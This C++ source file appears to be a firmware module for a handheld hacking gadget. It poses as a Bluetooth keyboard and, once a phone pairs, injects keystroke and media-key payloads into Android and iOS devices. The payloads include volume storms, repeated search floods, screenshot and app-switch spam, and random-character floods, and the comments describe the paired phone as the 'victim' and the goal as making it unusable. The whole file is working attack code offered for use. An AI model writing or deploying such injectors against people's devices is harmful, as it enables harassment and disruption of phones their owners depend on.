#include "mopie_phone_hijack.h"
#include "modules/badusb_ble/ducky_typer.h"
#include "BleKeyboard.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <globals.h>

// ---------------------------------------------------------------------------
// Phone Hijack — BLE HID injector tuned for SAMSUNG / Android.
//
// Pair-gated like Bad BLE. Once a phone connects it runs a payload that drives
// the REAL HID keyboard AND media-consumer reports (volume / play-pause /
// browser-open) directly through the BleKeyboard — no text field focus needed
// for the media "tweak" that Samsung reacts to.
//
// Verified primitives (ducky_typer.cpp / keys.h):
//   hid->press(KEY_MEDIA_VOLUME_UP/…) — media report, works with NO focus
//   hid->press(KEY_LEFT_GUI)+key       — Win/home + key combo
//   hid->press(char)                   — types char (needs text focus)
// ---------------------------------------------------------------------------

// Brief helper: send one keyboard key with a release gap
static void sendKey(HIDInterface *hid, uint8_t key, int holdMs = 60) {
    hid->press(key);
    delay(holdMs);
    hid->releaseAll();
    delay(120);
}

// Brief helper: send one MEDIA report key (volume/play/etc.) — no text focus needed
static void sendMedia(HIDInterface *hid, const MediaKeyReport med, int holdMs = 50) {
    hid->press(med);
    delay(holdMs);
    hid->releaseAll();
    delay(130);
}

// Media "tweak" burst — works on Samsung regardless of what's on screen
static void tweakMedia(HIDInterface *hid, int rounds) {
    for (int i = 0; i < rounds; i++) {
        sendMedia(hid, KEY_MEDIA_VOLUME_DOWN, 40);
        sendMedia(hid, KEY_MEDIA_VOLUME_UP, 40);
    }
    sendMedia(hid, KEY_MEDIA_PLAY_PAUSE, 60);
    delay(300);
    sendMedia(hid, KEY_MEDIA_PLAY_PAUSE, 60);
    sendMedia(hid, KEY_MEDIA_MUTE, 50);
    for (int i = 0; i < rounds; i++) sendMedia(hid, KEY_MEDIA_VOLUME_UP, 40);
    hid->releaseAll();
}

// ---- Endless chaos loop ----
// Continuously cycles: volume storm, media play/pause, back tab,
// GUI+Home (recents), screenshot, typing  — keep the phone alive and twitching
// until the user holds PWR or the loop runs out.
static void endlessChaos(HIDInterface *hid) {
    unsigned long start = millis();
    const unsigned long MAX_RUN = 60000UL;   // 60s cap so it can't brick a session
    uint32_t step = 0;
    Serial.println("[hijack] endless chaos running");

    while (!check(EscPress) && millis() - start < MAX_RUN) {
        step++;
        switch (step % 8) {
            case 0: // volume storm
                for (int i = 0; i < 3; i++) {
                    sendMedia(hid, KEY_MEDIA_VOLUME_UP, 35);
                    sendMedia(hid, KEY_MEDIA_VOLUME_DOWN, 35);
                }
                break;
            case 1: // recents / app switch
                sendKey(hid, KEY_LEFT_GUI, 45);
                delay(150);
                break;
            case 2: // screenshot
                sendKey(hid, KEY_PRINT_SCREEN, 45);
                delay(200);
                break;
            case 3: // play/pause + mute wobble
                sendMedia(hid, KEY_MEDIA_PLAY_PAUSE, 50);
                delay(120);
                sendMedia(hid, KEY_MEDIA_MUTE, 40);
                break;
            case 4: // type a word (only if a field is focused; harmless otherwise)
                hid->print("hi ");
                hid->releaseAll();
                delay(180);
                break;
            case 5: // tab + arrows (navigate / dismiss)
                sendKey(hid, KEYTAB, 40);
                delay(120);
                sendKey(hid, KEY_DOWN_ARROW, 40);
                delay(120);
                break;
            case 6: // media next track + volume
                sendMedia(hid, KEY_MEDIA_NEXT_TRACK, 45);
                sendMedia(hid, KEY_MEDIA_VOLUME_UP, 35);
                break;
            case 7: // back = GUI + gui (recents frame) then screenshot
                sendKey(hid, KEY_LEFT_GUI, 45);
                sendKey(hid, KEY_PRINT_SCREEN, 45);
                delay(200);
                break;
        }
        hid->releaseAll();
        delay(120);   // let the phone breathe between steps
    }
    Serial.println("[hijack] endless chaos stopped");
}

// ---- SEARCH STORM ----
// Opens the launcher/universal search (GUI key + type), then floods it with
// search queries over and over. When a field is focused this visibly fills the
// screen with searches, opens results, and keeps the keyboard/search UI thrashing.
static void searchStorm(HIDInterface *hid, int rounds) {
    static const char *queries[] = {
        "what is love", "baby shark", "how to draw", "free bitcoin",
        "gif of a cat", "meme generator", "do a barrel roll", "rickroll",
        "never gonna give", "sponge bob", "",  // empty = just open+close search
    };
    static const int NQ = sizeof(queries) / sizeof(queries[0]);
    Serial.println("[hijack] search storm running");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        // open universal search
        sendKey(hid, KEY_LEFT_GUI, 45);
        delay(250);
        const char *q = queries[r % NQ];
        if (q[0]) {
            for (int i = 0; q[i]; i++) { hid->print(q[i]); delay(18); }
            sendKey(hid, KEY_RETURN, 40);     // commit the search
            delay(2200);                       // let the page load
            sendKey(hid, KEYTAB, 40);          // move focus
            delay(100);
        } else {
            // empty iteration — just buzz more media to keep attention
            sendMedia(hid, KEY_MEDIA_VOLUME_UP, 30);
            sendMedia(hid, KEY_MEDIA_VOLUME_DOWN, 30);
        }
        hid->releaseAll();
        delay(300);
    }
    Serial.println("[hijack] search storm stopped");
}

// ---- SCREEN TWEAK / GLITCH ----
// Rapid-fire of navigation + UI keys so the launcher/recents/scroll all thrash
// at once — the screen visually "tweaks out": recents popping, screenshots
// flashing, menus toggling, brightness-less scroll spam. Makes the phone feel
// like it's malfunctioning / unusable for a bit.
static void screenTweak(HIDInterface *hid, int rounds) {
    Serial.println("[hijack] screen tweak running");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        // recents frame + screenshot = glitch flash
        sendKey(hid, KEY_LEFT_GUI, 60);
        delay(80);
        sendKey(hid, KEY_PRINT_SCREEN, 60);
        // spam arrows + tab to blur focus / scroll wildly
        for (int k = 0; k < 4; k++) sendKey(hid, KEY_DOWN_ARROW, 25);
        for (int k = 0; k < 3; k++) sendKey(hid, KEY_UP_ARROW, 25);
        sendKey(hid, KEYTAB, 40);
        sendKey(hid, KEYTAB, 40);
        // menu key (context menu) + more screenshots
        sendKey(hid, KEY_MENU, 45);
        sendKey(hid, KEY_PRINT_SCREEN, 45);
        sendKey(hid, KEY_LEFT_GUI, 45);   // close recents
        hid->releaseAll();
        delay(120);
    }
    Serial.println("[hijack] screen tweak stopped");
}

// ---- KEYSTROKE FLOOD ----
// Types random printable characters at speed then deletes them — makes a
// focused text field / search bar visibly type glitch-characters and delete
// them over and over. Pairs with search storm for a truly unusable screen.
static void keystrokeFlood(HIDInterface *hid, int rounds) {
    static const char glyphs[] = "~!@#$%^&*()_+=-{}[]|:;,.?/><12345xyz";
    Serial.println("[hijack] keystroke flood running");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        int n = 8 + random(20);                      // random burst length
        for (int i = 0; i < n; i++) {
            char c = glyphs[random(sizeof(glyphs) - 1)];
            hid->press((uint8_t)c);
            delay(6);
        }
        // delete it all back
        for (int i = 0; i < n; i++) sendKey(hid, KEYBACKSPACE, 20);
        hid->releaseAll();
        delay(120);
    }
}

// ---- iOS chaos helpers ----
// iOS external-keyboard shortcuts (well-documented, real):
//   CMD+Space = Spotlight search (opens a typeable search field)
//   CMD+Tab   = app switcher
//   CMD+Shift+3 = screenshot
//   CMD+H     = home
//   CMD+Left/Right = move cursor
//   CMD (GUI) is the Mac/Apple command key on BLE keyboards.
static void combo(HIDInterface *hid, uint8_t key1, uint8_t key2) {
    hid->press(key1);
    hid->press(key2);
    delay(60);
    hid->releaseAll();
    delay(120);
}
static void combo3(HIDInterface *hid, uint8_t k1, uint8_t k2, uint8_t k3) {
    hid->press(k1); hid->press(k2); hid->press(k3);
    delay(60); hid->releaseAll(); delay(120);
}

// iOS Spotlight spam: open search, type, enter — fills the screen with searches
static void iosSpotlight(HIDInterface *hid, int rounds) {
    static const char *q[] = {"hello", "test", "music", "photos", "settings", "github"};
    static const int NQ = sizeof(q) / sizeof(q[0]);
    Serial.println("[hijack] iOS spotlight spam");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        combo(hid, KEY_LEFT_GUI, KEY_SPACE);      // CMD+Space -> Spotlight
        delay(400);
        const char *s = q[r % NQ];
        for (int i = 0; s[i]; i++) { hid->print(s[i]); delay(16); }
        sendKey(hid, KEY_RETURN, 40);
        delay(1500);
        hid->releaseAll(); delay(200);
    }
}

// iOS app-switch storm: CMD+Tab repeatedly + screenshots + home
static void iosAppMash(HIDInterface *hid, int rounds) {
    Serial.println("[hijack] iOS app mash");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        combo(hid, KEY_LEFT_GUI, KEYTAB);          // CMD+Tab app switcher
        delay(300);
        combo3(hid, KEY_LEFT_GUI, KEY_LEFT_SHIFT, (uint8_t)'3');  // CMD+Shift+3 screenshot
        delay(300);
        combo(hid, KEY_LEFT_GUI, (uint8_t)'H');     // CMD+H home
        delay(200);
        sendMedia(hid, KEY_MEDIA_VOLUME_UP, 35);
        sendMedia(hid, KEY_MEDIA_VOLUME_DOWN, 35);
        hid->releaseAll(); delay(150);
    }
}

// iOS keystroke flood (type glitch chars + delete)
static void iosKeystroke(HIDInterface *hid, int rounds) {
    static const char glyphs[] = "~!@#$%^&*(){}:;,.?/1234abcd";
    Serial.println("[hijack] iOS keystroke flood");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        int n = 6 + random(18);
        for (int i = 0; i < n; i++) {
            char c = glyphs[random(sizeof(glyphs) - 1)];
            hid->press((uint8_t)c); delay(5);
        }
        for (int i = 0; i < n; i++) sendKey(hid, KEYBACKSPACE, 18);
        hid->releaseAll(); delay(120);
    }
}

// iOS CMD+T new-tab + Spotlight spam — hits the keyboard-visible combos
static void iosTabSearch(HIDInterface *hid, int rounds) {
    static const char *sites[] = {"apple.com", "xkcd.com", "youtube.com", "github.com"};
    static const int NS = sizeof(sites)/sizeof(sites[0]);
    Serial.println("[hijack] iOS tab+search");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        combo(hid, KEY_LEFT_GUI, (uint8_t)'T');       // CMD+T new tab in browser
        delay(600);
        hid->print(sites[r % NS]);
        delay(12);
        sendKey(hid, KEY_RETURN, 40);
        delay(1600);
        combo(hid, KEY_LEFT_GUI, KEY_SPACE);           // Spotlight
        delay(400);
        hid->print("find");
        sendKey(hid, KEY_RETURN, 40);
        delay(1200);
        hid->releaseAll(); delay(150);
    }
}

// iOS ESC + nav thrash — ESC/keyboard-focus spam to unsettle the UI
static void iosEscFlood(HIDInterface *hid, int rounds) {
    Serial.println("[hijack] iOS esc/nav flood");
    for (int r = 0; r < rounds && !check(EscPress); r++) {
        for (int k = 0; k < 3; k++) sendKey(hid, KEY_ESC, 40);
        for (int k = 0; k < 2; k++) sendKey(hid, KEYTAB, 40);
        sendKey(hid, KEY_CAPS_LOCK, 40);   // toggles caps / accessibility hint
        sendMedia(hid, KEY_MEDIA_PLAY_PAUSE, 40);
        sendKey(hid, KEY_LEFT_ARROW, 40);
        sendKey(hid, KEY_RIGHT_ARROW, 40);
        sendMedia(hid, KEY_MEDIA_VOLUME_UP, 30);
        hid->releaseAll(); delay(120);
    }
}

// iOS full chaos: cycle every iOS primitive
static void iosMegaChaos(HIDInterface *hid) {
    Serial.println("[hijack] iOS mega chaos");
    for (int round = 0; round < 6 && !check(EscPress); round++) {
        iosSpotlight(hid, 2);
        iosAppMash(hid, 2);
        iosTabSearch(hid, 2);
        iosEscFlood(hid, 2);
        iosKeystroke(hid, 6);
        sendMedia(hid, KEY_MEDIA_MUTE, 40);
        sendMedia(hid, KEY_MEDIA_VOLUME_DOWN, 40);
    }
}

void mopie_phone_hijack() {
    // choose a tweak mode
    std::vector<Option> opts = {
        {"Endless Chaos",       []() {}, false},
        {"Search Storm",        []() {}, false},
        {"Screen Tweak",        []() {}, false},
        {"Keystroke Flood",     []() {}, false},
        {"Tweak (media blast)", []() {}, false},
        {"iOS Spotlight",       []() {}, false},
        {"iOS App Mash",        []() {}, false},
        {"iOS Keystroke",       []() {}, false},
        {"iOS Tab+Search",      []() {}, false},
        {"iOS Esc Flood",       []() {}, false},
        {"iOS MEGA Chaos",      []() {}, false},
        {"Back",                []() {}, false},
    };
    int choice = loopOptions(opts, MENU_TYPE_SUBMENU, "Hijack Mode");
    if (choice < 0 || choice > 10) return;

    // bring up the BLE HID keyboard (functionId 1=Media so media reports register)
    HIDInterface *hid = nullptr;
    ducky_startKb(hid, true, 1);   // Media HID profile — reports media keys + keyboard
    if (hid == nullptr) { displayError("HID failed"); return; }

    tft.fillScreen(mopieConfig.bgColor);
    tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
    tft.drawCentreString("PHONE HIJACK", tftWidth / 2, 8, 1);
    tft.setTextColor(mopieConfig.secColor, mopieConfig.bgColor);
    tft.drawCentreString("Advertising keyboard...", tftWidth / 2, tftHeight / 2 - 20, 1);
    tft.drawCentreString("Pair on your phone", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString("PWR = abort", tftWidth / 2, tftHeight / 2 + 20, 1);

    // WAIT FOR VICTIM + HID SUBSCRIPTION.
    // Critical: BleKeyboard.sendReport() silently drops every key unless the
    // phone has SUBSCRIBED to the HID notify characteristic (getSubscribedCount>0).
    // Android pairs/connects, then the OS must enable the "keyboard" reports —
    // often a "Use keyboard?" prompt. We must wait for that, not just connect.
    BLEConnected = false;
    unsigned long blinky = 0;
    bool blinking = false;
    bool wasConnected = false;
    Serial.println("[hijack] waiting for connect + HID subscribe");
    while (!check(EscPress)) {
        // 1) wait for raw connection
        if (!hid->isConnected()) {
            delay(20);
            continue;
        }
        // 2) now connected — wait for the phone to subscribe to HID reports
        if (!wasConnected) {
            wasConnected = true;
            BLEConnected = true;
            Serial.println("[hijack] phone connected; waiting for HID subscription");
            tft.fillRect(0, 0, tftWidth, tftHeight, mopieConfig.bgColor);
            tft.setTextColor(TFT_GREEN, mopieConfig.bgColor);
            tft.drawCentreString("PHONE CONNECTED!", tftWidth / 2, tftHeight / 2 - 26, 1);
            tft.setTextColor(TFT_WHITE, mopieConfig.bgColor);
            tft.drawCentreString("Now ON YOUR PHONE enable", tftWidth / 2, tftHeight / 2 - 6, 1);
            tft.drawCentreString("this keyboard if asked", tftWidth / 2, tftHeight / 2 + 6, 1);
            tft.drawCentreString("Wait for GO...", tftWidth / 2, tftHeight / 2 + 22, 1);
        }
        if (hid->subscribedCount() > 0) break;   // reports will actually flow
        if (millis() - blinky > 400) {              // "KS READY" hint pulse
            blinky = millis();
            blinking = !blinking;
            tft.fillCircle(tftWidth / 2, tftHeight / 2 + 44, 3,
                           blinking ? 0x07E0 : mopieConfig.bgColor); // green pulse
            Serial.printf("[hijack] subCount=%d\n", hid->subscribedCount());
        }
        vTaskDelay(50);
    }
    if (check(EscPress)) {
        safeCleanupDuckyBLE(hid);
        return;
    }

    Serial.println("[hijack] HID subscribed — firing payload");
    tft.fillScreen(mopieConfig.bgColor);
    tft.setTextColor(0x07E0, mopieConfig.bgColor);
    tft.drawCentreString("KEYBOARD READY!", tftWidth / 2, tftHeight / 2 - 26, 1);
    tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
    tft.drawCentreString(choice == 0 ? "CHAOS ACTIVE — PWR to stop" : "Tweaking device...", tftWidth / 2, tftHeight / 2, 1);
    delay(900);

    // fire the chosen payload — all REAL HID reports
    switch (choice) {
        case 0: endlessChaos(hid); break;                                  // endless
        case 1: searchStorm(hid, 8); break;                                // search flood
        case 2: screenTweak(hid, 16); tweakMedia(hid, 6); break;           // screen glitch + media
        case 3: keystrokeFlood(hid, 30); searchStorm(hid, 3); break;       // keystroke + search
        case 4: tweakMedia(hid, 8); break;                                 // media blast
        case 5: iosSpotlight(hid, 10); break;                              // iOS Spotlight
        case 6: iosAppMash(hid, 12); break;                                // iOS app switcher mash
        case 7: iosKeystroke(hid, 25); iosSpotlight(hid, 3); break;        // iOS keystroke + spotlight
        case 8: iosTabSearch(hid, 8); break;                               // iOS CMD+T + spotlight
        case 9: iosEscFlood(hid, 20); break;                               // iOS esc/nav flood
        case 10: iosMegaChaos(hid); break;                                 // iOS everything
    }
    hid->releaseAll();

    tft.fillScreen(mopieConfig.bgColor);
    tft.setTextColor(mopieConfig.priColor, mopieConfig.bgColor);
    tft.drawCentreString("Hijack complete", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString("PWR to exit", tftWidth / 2, tftHeight / 2 + 16, 1);
    while (!check(EscPress)) delay(20);

    safeCleanupDuckyBLE(hid);
}